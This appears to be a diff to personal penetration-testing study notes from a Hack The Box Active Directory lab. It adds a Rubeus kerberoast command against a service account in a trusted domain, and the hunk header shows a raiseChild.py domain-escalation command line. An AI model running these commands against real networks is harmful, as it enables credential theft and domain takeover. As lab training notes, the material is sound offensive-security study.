@@ -533,6 +533,10 @@ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_
 **Situation One**
 1. Find domain user who is domain admin
 2. Run rubeus, specifying domain and user
+```
+\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+```
 **Admin Password Reuse**
 - Foreign group membership can be found 
 #### Linux 
+
